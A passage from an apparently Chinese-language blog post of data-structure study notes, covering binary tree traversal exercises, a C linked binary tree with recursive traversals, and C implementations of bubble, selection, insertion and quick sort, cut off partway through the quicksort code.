class="line">那么此二叉树的后序为：GHDBEIFCA</span><br></pre></td></tr></table></figure><p>例子3：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">中序：BDCEAFHG，后序：DECBHGFA，求先序？</span><br><span class="line">分析：由后序结果知A为最外层根节点，再根据中序结果知BDCE为A节点的左子树，FHG为A的右子树；A的左子树中B最靠近A那么根据后序规则得出B为左子树的根节点，再根据中序结果B在结果的第一位，由中序规则知B没有左子树，DCE均为B的右子树，在DCE中后序结果C最靠近B，得出C为B的右子树的根节点，再依据中序结果知C前面是D后面是E得出D为C的左子树，E为C的右子树，同理可以推出A的右子树，得出原始二叉树为：        </span><br><span class="line">     A       </span><br><span class="line">/ \</span><br><span class="line">           B   F</span><br><span class="line">            \   \</span><br><span class="line">         C   G</span><br><span class="line">            / \  /</span><br><span class="line">           D   E H</span><br><span class="line">那么此二叉树的先序为：ABCDEFGH</span><br></pre></td></tr></table></figure></blockquote></li></ul><p><strong>树的应用</strong></p><ul><li>树是数据库中数据组织的一种重要形式</li><li>操作系统子父进程的关系本身就是一棵树</li><li>面向对象语言中类的继承关系本身就是一棵树</li><li>赫夫曼树</li></ul><h2 id="3-1-链式二叉树"><a href="#3-1-链式二叉树" class="headerlink" title="3.1 链式二叉树"></a>3.1 链式二叉树</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> * <span class="title">pLchild</span>;</span> <span class="comment">//p是指针 L是左 child是孩子</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> * <span class="title">pRchild</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PreTraverseBTree</span><span class="params">(<span class="keyword">struct</span> BTNode *)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InTraverseBTree</span><span class="params">(<span class="keyword">struct</span> BTNode *)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">PostTraverseBTree</span><span class="params">(<span class="keyword">struct</span> BTNode *)</span>;</span><br><span class="line"><span class="keyword">struct</span> BTNode * <span class="title function_">CreateBTree</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> * <span class="title">pT</span> =</span> CreateBTree();</span><br><span class="line"></span><br><span class="line">    PreTraverseBTree(pT); <span class="comment">//先序</span></span><br><span class="line">    InTraverseBTree(pT); <span class="comment">//中序</span></span><br><span class="line">    PostTraverseBTree(pT); <span class="comment">//后序</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PreTraverseBTree</span><span class="params">(<span class="keyword">struct</span> BTNode * pT)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != pT)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, pT-&gt;data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> != pT-&gt;pLchild)</span><br><span class="line">        &#123;</span><br><span class="line">            PreTraverseBTree(pT-&gt;pLchild); <span class="comment">//pT-&gt;pLchild可以代表整个左子树</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> != pT-&gt;pRchild)</span><br><span class="line">        &#123;</span><br><span class="line">            PreTraverseBTree(pT-&gt;pRchild);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    先访问根节点</span></span><br><span class="line"><span class="comment">    再先序访问左子树</span></span><br><span class="line"><span class="comment">    再先序访问右子树</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InTraverseBTree</span><span class="params">(<span class="keyword">struct</span> BTNode * pT)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != pT)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> != pT-&gt;pLchild)</span><br><span class="line">        &#123;</span><br><span class="line">            InTraverseBTree(pT-&gt;pLchild); <span class="comment">//pT-&gt;pLchild可以代表整个左子树</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, pT-&gt;data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> != pT-&gt;pRchild)</span><br><span class="line">        &#123;</span><br><span class="line">            InTraverseBTree(pT-&gt;pRchild);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    先访问左子树</span></span><br><span class="line"><span class="comment">    再访问根</span></span><br><span class="line"><span class="comment">    再访问右子树</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PostTraverseBTree</span><span class="params">(<span class="keyword">struct</span> BTNode * pT)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != pT)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> != pT-&gt;pLchild)</span><br><span class="line">        &#123;</span><br><span class="line">            PostTraverseBTree(pT-&gt;pLchild); <span class="comment">//pT-&gt;pLchild可以代表整个左子树</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> != pT-&gt;pRchild)</span><br><span class="line">        &#123;</span><br><span class="line">            PostTraverseBTree(pT-&gt;pRchild);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, pT-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    先访问左子树</span></span><br><span class="line"><span class="comment">    再访问右子树</span></span><br><span class="line"><span class="comment">    再访问根</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> BTNode * <span class="title function_">CreateBTree</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> * <span class="title">pA</span> =</span> (<span class="keyword">struct</span> BTNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> BTNode));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> * <span class="title">pB</span> =</span> (<span class="keyword">struct</span> BTNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> BTNode));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> * <span class="title">pC</span> =</span> (<span class="keyword">struct</span> BTNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> BTNode));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> * <span class="title">pD</span> =</span> (<span class="keyword">struct</span> BTNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> BTNode));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> * <span class="title">pE</span> =</span> (<span class="keyword">struct</span> BTNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> BTNode));</span><br><span class="line"></span><br><span class="line">    pA-&gt;data = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    pB-&gt;data = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">    pC-&gt;data = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">    pD-&gt;data = <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">    pE-&gt;data = <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    pA-&gt;pLchild = pB;</span><br><span class="line">    pA-&gt;pRchild = pC;</span><br><span class="line">    pB-&gt;pLchild = pB-&gt;pRchild = <span class="literal">NULL</span>;</span><br><span class="line">    pC-&gt;pLchild = pD;</span><br><span class="line">    pC-&gt;pRchild = <span class="literal">NULL</span>;</span><br><span class="line">    pD-&gt;pLchild = <span class="literal">NULL</span>;</span><br><span class="line">    pD-&gt;pRchild = pE;</span><br><span class="line">    pE-&gt;pLchild = pE-&gt;pRchild = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="4-查找和排序"><a href="#4-查找和排序" class="headerlink" title="4. 查找和排序"></a>4. 查找和排序</h1><p>排序和查找的关系：排序是查找的前提，排序是重点。</p><h2 id="4-1-冒泡排序"><a href="#4-1-冒泡排序" class="headerlink" title="4.1 冒泡排序"></a>4.1 冒泡排序</h2><p>冒泡排序的基本思想：重复走访过要排序的元素列，依次比较两个相邻的元素，如果顺序错误就把它们交换过来。走访元素的工作是重复地进行直到没有相邻元素需要交换，也就是说该元素列已经排序完成。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARR_LEN 255 <span class="comment">/*数组长度上限*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> elemType int <span class="comment">/*元素类型*/</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 冒泡排序 */</span></span><br><span class="line"><span class="comment">/* 1. 从当前元素起，向后依次比较每一对相邻元素，若逆序则交换 */</span></span><br><span class="line"><span class="comment">/* 2. 对所有元素均重复以上步骤，直至最后一个元素 */</span></span><br><span class="line"><span class="comment">/* elemType arr[]: 排序目标数组; int len: 元素个数 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bubbleSort</span> <span class="params">(elemType arr[], <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    elemType temp;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len<span class="number">-1</span>; i++) <span class="comment">/* 外循环为排序趟数，len个数进行len-1趟 */</span></span><br><span class="line">        <span class="keyword">for</span> (j=<span class="number">0</span>; j&lt;len<span class="number">-1</span>-i; j++) &#123; <span class="comment">/* 内循环为每趟比较的次数，第i趟比较len-i次 */</span></span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j+<span class="number">1</span>]) &#123; <span class="comment">/* 相邻元素比较，若逆序则交换（升序为左大于右，降序反之） */</span></span><br><span class="line">                temp = arr[j];</span><br><span class="line">                arr[j] = arr[j+<span class="number">1</span>];</span><br><span class="line">                arr[j+<span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    elemType arr[ARR_LEN] = &#123;<span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">-7</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">-6</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">     </span><br><span class="line">    bubbleSort (arr, len);</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;%d\t&quot;</span>, arr[i]);</span><br><span class="line">    <span class="built_in">putchar</span> (<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-2-选择排序"><a href="#4-2-选择排序" class="headerlink" title="4.2 选择排序"></a>4.2 选择排序</h2><p>选择排序的基本思想：第一次从待排序的数据元素中选出最小（或最大）的一个元素，存放在序列的起始位置，然后再从剩余的未排序元素中寻找到最小（大）元素，然后放到已排序的序列的末尾。以此类推，直到全部待排序的数据元素的个数为零。选择排序是不稳定的排序方法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">choseSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">int</span> min, temp;</span><br><span class="line">    <span class="comment">// 每次从未排序的部分选出一个最小的元素，最后一次只剩一个元素未排序</span></span><br><span class="line">    <span class="comment">// 此时实际上已经排好序，故只需要n-1次外层大循环</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        min = i;    <span class="comment">// 假定未排序部分的第一个元素为最小的元素</span></span><br><span class="line">        <span class="comment">// 遍历剩下的部分，找到最小的元素</span></span><br><span class="line">        <span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; n; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &lt; arr[min]) &#123;</span><br><span class="line">                min = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果第一个元素就是最小的元素，就不需要交换了</span></span><br><span class="line">        <span class="keyword">if</span> (min != i) &#123;</span><br><span class="line">            temp = arr[i];</span><br><span class="line">            arr[i] = arr[min];</span><br><span class="line">            arr[min] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">7</span>&#125;;</span><br><span class="line">    choseSort(arr, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-3-插入排序"><a href="#4-3-插入排序" class="headerlink" title="4.3 插入排序"></a>4.3 插入排序</h2><p>插入排序的基本思想：将第一个待排序元素看做是一个有序序列，用下一个未排序元素，从后往前比较，然后放入到相应的位置，每比较一次有序序列就增加一个元素，这样就能把每个未排序的元素插入到相应的位置，将序列变得有序。</p><img src="/posts/79666db/%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F%E5%9B%BE%E8%A7%A3.png" class="" title="插入排序"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//插入排序 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InsertSort</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出数组中的元素 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">OutputArray</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">7</span>] = &#123; <span class="number">2</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">6</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//输出数组中的元素 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;排序前的数据:&quot;</span>);</span><br><span class="line">    OutputArray(a, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//插入排序 </span></span><br><span class="line">    InsertSort(a, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//输出排序后的结果 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;排序后的数据:&quot;</span>);</span><br><span class="line">    OutputArray(a, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入排序 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InsertSort</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = a[i];</span><br><span class="line">        <span class="keyword">for</span> (j = i; j &gt; <span class="number">0</span> &amp;&amp; a[j - <span class="number">1</span>] &gt; temp; j--)</span><br><span class="line">        &#123;</span><br><span class="line">            a[j] = a[j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        a[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出数组中的元素 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">OutputArray</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-4-快速排序"><a href="#4-4-快速排序" class="headerlink" title="4.4 快速排序"></a>4.4 快速排序</h2><p>快速排序是对冒泡排序的一种改进。</p><p>快速排序算法通过多次比较和交换来实现排序，其排序流程如下：</p><p>(1)首先设定一个分界值，通过该分界值将数组分成左右两部分。</p><p>(2)将大于或等于分界值的数据集中到数组右边，小于分界值的数据集中到数组的左边。此时，左边部分中各元素都小于分界值，而右边部分中各元素都大于或等于分界值。 </p><p>(3)然后，左边和右边的数据可以独立排序。对于左侧的数组数据，又可以取一个分界值，将该部分数据分成左右两部分，同样在左边放置较小值，右边放置较大值。右侧的数组数据也可以做类似处理。</p><p>(4)重复上述过程，可以看出，这是一个递归定义。通过递归将左侧部分排好序后，再递归排好右侧部分的顺序。当左、右两个部分各数据排序完成后，整个数组的排序也就完成了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">QuickSort</span><span class="params">(<span class="type">int</span> *, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">FindPos</span><span class="params">(<span class="type">int</span> *, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">6</span>] = &#123;<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    QuickSort(a, <span class="number">0</span> , <span class="number">5</span>); <span class="comment">//第二个参数表示第一个元素的下标，第三个参数表示最后一个元素的下标</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">QuickSort</span><span class="params">(<span class="type">int</span> * a, <span class="type">int</span> low, <span class="type">int</span> high)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> pos;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(low &lt; high)</span><br><span class="line">    &#123;</span><br><span class="line">        pos = FindPos(a, low, high);</span><br><span class="line">        QuickSort(a, low, pos<span class="number">-1</span>);</span><br><span class="line">        QuickSort(a, pos+<span class="number">1</span>, high);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">FindPos</span><span class="params">(<span class="type">int</span> * a, <span class="type">int</span> low, <span class="type">int</span> high)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val = a[low];</span><br><span class="line">    <span class="keyword">while</span>(low &lt; high)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(low&lt;high &amp;&amp; a[high]&gt;=val)</span><br><span class="line">            --high;</span><br><span class="line">        a[low] = a[high];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(low&lt;high &amp;&amp; a[low]&lt;=val)</span><br><span 